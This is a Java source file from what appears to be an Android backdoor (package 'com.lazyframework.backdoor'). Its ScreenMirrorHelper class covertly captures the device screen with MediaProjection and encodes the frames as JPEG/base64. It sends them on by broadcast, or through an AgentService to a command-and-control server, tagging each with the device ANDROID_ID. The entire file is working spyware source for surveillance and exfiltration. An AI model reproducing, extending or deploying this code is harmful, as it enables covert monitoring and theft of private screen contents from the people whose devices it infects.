package com.lazyframework.backdoor;

import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.Settings;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.WindowManager;

import androidx.annotation.RequiresApi;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.concurrent.atomic.AtomicBoolean;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class ScreenMirrorHelper {

    private static final String TAG = "ScreenMirrorHelper";

    // ==================== CONFIGURATION ====================
    private static final int QUALITY = 50;
    private static final long MIN_INTERVAL = 50;  // 2 FPS max
    private static final int MAX_RETRY = 3;
    private static final int FRAME_MONITOR_INTERVAL = 3000;

    // ==================== CONTEXT & THREADS ====================
    private Context context;
    private Handler handler;
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;

    // ==================== MEDIA PROJECTION ====================
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;

    // ==================== STATE ====================
    private AtomicBoolean isCapturing = new AtomicBoolean(false);
    private AtomicBoolean isPaused = new AtomicBoolean(false);
    private long lastCaptureTime = 0;
    private int frameCount = 0;
    private int errorCount = 0;
    private boolean isInitialized = false;
    private Bitmap lastFrame = null;  // ✅ Untuk menyimpan frame terakhir

    // ==================== SCREEN DIMENSIONS ====================
    private int screenWidth = 0;
    private int screenHeight = 0;
    private int screenDensity = 0;

    // ==================== CONSTRUCTOR ====================

    public ScreenMirrorHelper() {
        Log.d(TAG, "🏗️ ScreenMirrorHelper constructed");
    }

    // ==================== INITIALIZATION ====================

    public void onCreate(Context ctx) {
        this.context = ctx;
        Log.d(TAG, "📱 onCreate called");

        backgroundThread = new HandlerThread("ScreenMirrorThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());

        handler = new Handler(Looper.getMainLooper());

        getScreenDimensions();

        isInitialized = true;
        Log.d(TAG, "✅ ScreenMirrorHelper initialized");
        Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

        ServiceController.setScreenMirrorHelper(this);
        Log.d(TAG, "✅ Registered with ServiceController");
    }

    // ==================== SCREEN DIMENSIONS ====================

    private void getScreenDimensions() {
        try {
            if (context == null) {
                setDefaultDimensions();
                return;
            }

            WindowManager wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            if (wm == null) {
                setDefaultDimensions();
                return;
            }

            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(metrics);

            screenWidth = metrics.widthPixels;
            screenHeight = metrics.heightPixels;
            screenDensity = metrics.densityDpi;

            if (screenWidth <= 0 || screenHeight <= 0) {
                setDefaultDimensions();
            }

            Log.d(TAG, "📱 Screen dimensions: " + screenWidth + "x" + screenHeight);

        } catch (Exception e) {
            Log.e(TAG, "Error getting screen dimensions: " + e.getMessage());
            setDefaultDimensions();
        }
    }

    private void setDefaultDimensions() {
        screenWidth = 1080;
        screenHeight = 1920;
        screenDensity = 420;
        Log.d(TAG, "📱 Using default dimensions: 1080x1920 @ 420dpi");
    }

    // ==================== START SCREEN CAPTURE ====================

    public synchronized void startScreenCapture(MediaProjection projection) {
        Log.d(TAG, "🔄 startScreenCapture called");

        if (isCapturing.get()) {
            Log.d(TAG, "⚠️ Already capturing, ignoring start request");
            return;
        }

        if (!isInitialized) {
            Log.e(TAG, "❌ Helper not initialized. Call onCreate() first");
            notifyMirrorError("Helper not initialized");
            return;
        }

        if (projection == null) {
            Log.e(TAG, "❌ MediaProjection is null");
            notifyMirrorError("MediaProjection is null");
            return;
        }

        if (context == null) {
            Log.e(TAG, "❌ Context is null");
            notifyMirrorError("Context is null");
            return;
        }

        if (screenWidth <= 0 || screenHeight <= 0) {
            getScreenDimensions();
            if (screenWidth <= 0 || screenHeight <= 0) {
                setDefaultDimensions();
            }
        }

        Log.d(TAG, "📱 Screen: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

        try {
            this.mediaProjection = projection;

            this.mediaProjection.registerCallback(new MediaProjection.Callback() {
                @Override
                public void onStop() {
                    Log.d(TAG, "🛑 MediaProjection stopped by system");
                    isCapturing.set(false);
                    cleanup();

                    AgentService service = ServiceController.getAgentService();
                    if (service != null) {
                        service.onMirrorStopped();
                        service.sendMirrorStatus(false);
                        Log.d(TAG, "📤 Mirror stopped callback sent via ServiceController");
                    } else {
                        Log.w(TAG, "⚠️ AgentService not available for stop callback");
                        sendMirrorStatusBroadcast(false);
                    }
                }
            }, backgroundHandler);

            if (imageReader != null) {
                try {
                    imageReader.close();
                } catch (Exception e) {
                    Log.w(TAG, "Error closing old ImageReader: " + e.getMessage());
                }
                imageReader = null;
            }

            imageReader = ImageReader.newInstance(
                    screenWidth,
                    screenHeight,
                    PixelFormat.RGBA_8888,
                    2
            );

            if (imageReader == null) {
                Log.e(TAG, "❌ Failed to create ImageReader");
                notifyMirrorError("Failed to create ImageReader");
                cleanup();
                return;
            }

            if (virtualDisplay != null) {
                try {
                    virtualDisplay.release();
                } catch (Exception e) {
                    Log.w(TAG, "Error releasing old VirtualDisplay: " + e.getMessage());
                }
                virtualDisplay = null;
            }

            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "LazyFramework_Mirror",
                    screenWidth,
                    screenHeight,
                    screenDensity,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(),
                    null,
                    backgroundHandler
            );

            if (virtualDisplay == null) {
                Log.e(TAG, "❌ VirtualDisplay creation failed");
                notifyMirrorError("VirtualDisplay creation failed");
                cleanup();
                return;
            }

            imageReader.setOnImageAvailableListener(
                    this::processImage,
                    backgroundHandler
            );

            isCapturing.set(true);
            isPaused.set(false);
            frameCount = 0;
            errorCount = 0;

            Log.d(TAG, "✅ Screen capture STARTED successfully");
            Log.d(TAG, "📊 VirtualDisplay: " + screenWidth + "x" + screenHeight + " @ " + screenDensity + "dpi");

            AgentService service = ServiceController.getAgentService();

            if (service != null) {
                service.onMirrorStarted();
                Log.d(TAG, "📤 onMirrorStarted() called via ServiceController");
                service.sendMirrorStatus(true);
                Log.d(TAG, "📤 sendMirrorStatus(true) sent via ServiceController");
            } else {
                Log.w(TAG, "⚠️ AgentService not available via ServiceController");
                Log.w(TAG, "   Status: " + ServiceController.getDebugInfo());

                AgentService retryService = ServiceController.getAgentService();
                if (retryService != null) {
                    retryService.onMirrorStarted();
                    retryService.sendMirrorStatus(true);
                    Log.d(TAG, "📤 Retry: Mirror status sent successfully");
                } else {
                    sendMirrorStatusBroadcast(true);
                    Log.d(TAG, "📤 Fallback: Mirror status broadcast sent");
                }
            }

            startFrameMonitor();

        } catch (SecurityException e) {
            Log.e(TAG, "❌ Security exception: " + e.getMessage(), e);
            notifyMirrorError("Security: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

        } catch (IllegalStateException e) {
            Log.e(TAG, "❌ Illegal state: " + e.getMessage(), e);
            notifyMirrorError("Illegal state: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

        } catch (Exception e) {
            Log.e(TAG, "❌ Unexpected error: " + e.getMessage(), e);
            notifyMirrorError("Error: " + e.getMessage());
            cleanup();
            isCapturing.set(false);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                try {
                    Log.d(TAG, "🔄 Attempting recovery...");
                    if (mediaProjection != null) {
                        mediaProjection.stop();
                        mediaProjection = null;
                    }
                    Thread.sleep(1000);
                    getScreenDimensions();
                } catch (Exception recoveryError) {
                    Log.e(TAG, "❌ Recovery failed: " + recoveryError.getMessage());
                }
            }
        }
    }

    // ==================== FRAME MONITOR ====================

    private void startFrameMonitor() {
        if (backgroundHandler == null) return;

        backgroundHandler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isCapturing.get()) return;

                int currentFrames = frameCount;
                if (currentFrames > 0) {
                    Log.d(TAG, "📊 Frames captured: " + currentFrames);
                } else {
                    Log.w(TAG, "⚠️ No frames captured yet. Check if screen is active.");
                }

                if (isCapturing.get()) {
                    backgroundHandler.postDelayed(this, FRAME_MONITOR_INTERVAL);
                }
            }
        }, 5000);
    }

    // ==================== PROCESS IMAGE ====================

    private void processImage(ImageReader reader) {
        if (!isCapturing.get() || isPaused.get()) {
            return;
        }

        if (reader == null) {
            Log.w(TAG, "⚠️ ImageReader is null in processImage");
            return;
        }

        Image image = null;
        try {
            long now = System.currentTimeMillis();

            if (now - lastCaptureTime < MIN_INTERVAL) {
                return;
            }
            lastCaptureTime = now;

            image = reader.acquireLatestImage();
            if (image == null) {
                Log.w(TAG, "⚠️ No image available in processImage");
                return;
            }

            Log.d(TAG, "📸 Image acquired: " + image.getWidth() + "x" + image.getHeight());

            Bitmap bitmap = imageToBitmap(image);
            if (bitmap == null) {
                Log.w(TAG, "⚠️ Bitmap conversion failed");
                errorCount++;
                if (errorCount > MAX_RETRY) {
                    Log.w(TAG, "⚠️ Too many errors (" + errorCount + "), resetting...");
                    resetCapture();
                }
                return;
            }

            // ✅ SAVE LAST FRAME FOR SCREENSHOT
            if (bitmap != null) {
                if (lastFrame != null && !lastFrame.isRecycled()) {
                    lastFrame.recycle();
                }
                lastFrame = bitmap.copy(bitmap.getConfig(), true);
                Log.d(TAG, "💾 Last frame saved for screenshot (" + lastFrame.getWidth() + "x" + lastFrame.getHeight() + ")");
            }

            Log.d(TAG, "🖼️ Bitmap created: " + bitmap.getWidth() + "x" + bitmap.getHeight());

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, QUALITY, baos);
            bitmap.recycle();

            byte[] jpegData = baos.toByteArray();
            String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);

            Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
            intent.putExtra("frame_data", base64);
            intent.putExtra("frame_number", frameCount++);
            intent.putExtra("timestamp", System.currentTimeMillis());

            context.sendBroadcast(intent);
            baos.close();

            Log.d(TAG, "📦 JPEG size: " + jpegData.length + " bytes");

            if (jpegData == null || jpegData.length < 1000) {
                Log.w(TAG, "⚠️ JPEG data too small (" + (jpegData != null ? jpegData.length : 0) + " bytes), skipping");
                return;
            }

            //frameCount++;
            frameCount++;
            int currentFrame = frameCount;

            intent.putExtra("frame_number", currentFrame);
            Log.d(TAG, "📊 Frame #" + frameCount + " captured, size: " + jpegData.length + " bytes");

            boolean sent = sendFrameToAgent(jpegData);

            if (sent) {
                errorCount = 0;
                Log.d(TAG, "✅ Frame #" + frameCount + " processed successfully");
            } else {
                Log.w(TAG, "⚠️ Frame #" + frameCount + " failed to send");
                errorCount++;
            }

        } catch (OutOfMemoryError e) {
            Log.e(TAG, "❌ Out of memory: " + e.getMessage());
            System.gc();
        } catch (Exception e) {
            Log.e(TAG, "❌ Process image error: " + e.getMessage(), e);
            errorCount++;
        } finally {
            if (image != null) {
                try {
                    image.close();
                } catch (Exception e) {
                    // Ignore
                }
            }
        }
    }

    // ==================== IMAGE TO BITMAP ====================

    private Bitmap imageToBitmap(Image image) {
        if (image == null) return null;

        try {
            Image.Plane[] planes = image.getPlanes();
            if (planes == null || planes.length == 0) {
                return null;
            }

            ByteBuffer buffer = planes[0].getBuffer();
            if (buffer == null) {
                return null;
            }

            int width = image.getWidth();
            int height = image.getHeight();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();

            Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);

            if (rowStride == pixelStride * width) {
                bitmap.copyPixelsFromBuffer(buffer);
            } else {
                ByteBuffer dstBuffer = ByteBuffer.allocate(width * height * 4);
                for (int row = 0; row < height; row++) {
                    buffer.position(row * rowStride);
                    byte[] rowData = new byte[width * 4];
                    buffer.get(rowData);
                    dstBuffer.put(rowData);
                }
                dstBuffer.rewind();
                bitmap.copyPixelsFromBuffer(dstBuffer);
            }

            return bitmap;

        } catch (IllegalArgumentException e) {
            Log.e(TAG, "Invalid image format: " + e.getMessage());
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Image to bitmap error: " + e.getMessage());
            return null;
        }
    }

    // ==================== SEND FRAME TO AGENT ====================

    // ScreenMirrorHelper.java - Ganti method sendFrameToAgent

    // ScreenMirrorHelper.java - Ganti method sendFrameToAgent()

private boolean sendFrameToAgent(byte[] jpegData) {
    if (jpegData == null || jpegData.length == 0) {
        Log.w(TAG, "⚠️ JPEG data is null or empty");
        return false;
    }

    try {
        String base64 = Base64.encodeToString(jpegData, Base64.NO_WRAP);
        if (base64 == null || base64.isEmpty()) {
            Log.w(TAG, "⚠️ Base64 encoding failed");
            return false;
        }

        // ✅ KIRIM VIA BROADCAST DENGAN FORMAT YANG BENAR
        if (context != null) {
            Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
            intent.putExtra("frame_data", base64);
            intent.putExtra("width", screenWidth);
            intent.putExtra("height", screenHeight);
            intent.putExtra("frame_number", frameCount);
            intent.putExtra("timestamp", System.currentTimeMillis());
            intent.setPackage(context.getPackageName());

            context.sendBroadcast(intent);
            
            // ✅ LOG FRAME
            if (frameCount % 5 == 0) {
                Log.d(TAG, "✅ Frame " + frameCount + " sent via Broadcast (size: " + jpegData.length + " bytes)");
            }
            return true;
        }

        // ✅ FALLBACK: KIRIM LANGSUNG KE C2 VIA AGENTSERVICE
        AgentService service = ServiceController.getAgentService();
        if (service != null && service.isC2Connected()) {
            JSONObject json = new JSONObject();
            json.put("type", "response");
            json.put("agent_id", getAgentId());
            json.put("command", "SCREEN_FRAME");

            JSONObject result = new JSONObject();
            result.put("type", "screen_frame");
            result.put("width", screenWidth);
            result.put("height", screenHeight);
            result.put("data", base64);
            result.put("timestamp", System.currentTimeMillis());
            result.put("frame_number", frameCount);

            json.put("result", result);
            service.sendRawData(json.toString());
            return true;
        }

        Log.e(TAG, "❌ No send method available for frame " + frameCount);
        return false;

    } catch (Exception e) {
        Log.e(TAG, "❌ sendFrameToAgent error: " + e.getMessage(), e);
        return false;
    }
}

    private void sendFrameViaBroadcast(String base64) {
        try {
            if (context == null) {
                Log.w(TAG, "⚠️ Context null, cannot send broadcast");
                return;
            }

            Intent intent = new Intent("com.lazyframework.SCREEN_FRAME");
            intent.putExtra("data", base64);
            //intent.putExtra("frame_data", base64);
            intent.putExtra("width", screenWidth);
            intent.putExtra("height", screenHeight);
            intent.putExtra("frame_number", frameCount);
            intent.putExtra("timestamp", System.currentTimeMillis());
            intent.setPackage(context.getPackageName());

            context.sendBroadcast(intent);

            if (frameCount % 10 == 0) {
                Log.d(TAG, "📤 Frame " + frameCount + " sent via broadcast");
            }
        } catch (Exception e) {
            Log.e(TAG, "Broadcast send error: " + e.getMessage());
        }
    }

    // ==================== CONTROL METHODS ====================

    public void pauseCapture() {
        isPaused.set(true);
        Log.d(TAG, "⏸️ Capture paused");
    }

    public void resumeCapture() {
        isPaused.set(false);
        Log.d(TAG, "▶️ Capture resumed");
    }

    public void stopScreenCapture() {
        Log.d(TAG, "⏹️ Stopping screen capture...");
        isCapturing.set(false);
        isPaused.set(false);
        cleanup();

        AgentService service = ServiceController.getAgentService();
        if (service != null) {
            service.onMirrorStopped();
            service.sendMirrorStatus(false);
            Log.d(TAG, "📤 Mirror stopped callback sent via ServiceController");
        } else {
            Log.w(TAG, "⚠️ AgentService not available for stop callback");
            sendMirrorStatusBroadcast(false);
        }
    }

    // ==================== RESET ====================

    private void resetCapture() {
        Log.d(TAG, "🔄 Resetting capture...");
        cleanup();
        errorCount = 0;
        isCapturing.set(false);

        if (mediaProjection != null) {
            Log.d(TAG, "🔄 Attempting restart...");
            startScreenCapture(mediaProjection);
        }
    }

    // ==================== CLEANUP ====================

    private void cleanup() {
        Log.d(TAG, "🧹 Cleaning up resources...");

        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
                Log.d(TAG, "✅ VirtualDisplay released");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error releasing VirtualDisplay: " + e.getMessage());
        }

        try {
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
                Log.d(TAG, "✅ ImageReader closed");
            }
        } catch (Exception e) {
            Log.w(TAG, "Error closing ImageReader: " + e.getMessage());
        }

        // ✅ Clear last frame
        if (lastFrame != null && !lastFrame.isRecycled()) {
            lastFrame.recycle();
            lastFrame = null;
            Log.d(TAG, "✅ Last frame cleared");
        }

        if (backgroundHandler != null) {
            backgroundHandler.removeCallbacksAndMessages(null);
        }

        Log.d(TAG, "✅ Cleanup complete");
    }

    public void destroy() {
        Log.d(TAG, "💀 Destroying ScreenMirrorHelper...");

        stopScreenCapture();

        // ✅ Cleanup last frame
        if (lastFrame != null && !lastFrame.isRecycled()) {
            lastFrame.recycle();
            lastFrame = null;
            Log.d(TAG, "✅ Last frame recycled");
        }

        if (backgroundThread != null) {
            try {
                backgroundThread.quitSafely();
                backgroundThread = null;
            } catch (Exception e) {
                Log.w(TAG, "Error stopping background thread: " + e.getMessage());
            }
        }

        if (handler != null) {
            handler.removeCallbacksAndMessages(null);
            handler = null;
        }

        if (mediaProjection != null) {
            try {
                mediaProjection.stop();
                mediaProjection = null;
            } catch (Exception e) {
                Log.w(TAG, "Error stopping MediaProjection: " + e.getMessage());
            }
        }

        ServiceController.clearMirrorHelper();

        context = null;
        isInitialized = false;

        Log.d(TAG, "✅ ScreenMirrorHelper destroyed");
    }

    // ==================== GETTERS ====================

    public boolean isCapturing() {
        return isCapturing.get();
    }

    public boolean isPaused() {
        return isPaused.get();
    }

    public int getFrameCount() {
        return frameCount;
    }

    public int getScreenWidth() {
        return screenWidth;
    }

    public int getScreenHeight() {
        return screenHeight;
    }

    // ✅ METHOD UNTUK AMBIL LAST FRAME UNTUK SCREENSHOT
    public Bitmap getLastFrame() {
        if (lastFrame != null && !lastFrame.isRecycled()) {
            return Bitmap.createBitmap(lastFrame); // Return copy
        }
        return null;
    }

    // ==================== HELPER METHODS ====================

    private String getAgentId() {
        if (context == null) return "unknown";
        try {
            return Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );
        } catch (Exception e) {
            return "unknown";
        }
    }

    private void sendMirrorStatusBroadcast(boolean active) {
        try {
            android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_STATUS_BROADCAST");
            intent.putExtra("mirror_active", active);
            intent.putExtra("agent_id", getAgentId());
            intent.putExtra("timestamp", System.currentTimeMillis());

            if (context != null) {
                context.sendBroadcast(intent);
                Log.d(TAG, "📡 Mirror status broadcast sent: " + active);
            }
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }

    private void notifyMirrorError(String error) {
        Log.e(TAG, "❌ Mirror error: " + error);

        AgentService service = ServiceController.getAgentService();
        if (service != null) {
            try {
                service.sendMirrorStatus(false);
                Log.d(TAG, "📤 Error status sent to AgentService");
            } catch (Exception e) {
                Log.e(TAG, "Error sending error status: " + e.getMessage());
            }
        }

        try {
            android.content.Intent intent = new android.content.Intent("com.lazyframework.MIRROR_ERROR");
            intent.putExtra("error", error);
            intent.putExtra("agent_id", getAgentId());
            if (context != null) {
                context.sendBroadcast(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Broadcast error: " + e.getMessage());
        }
    }
}
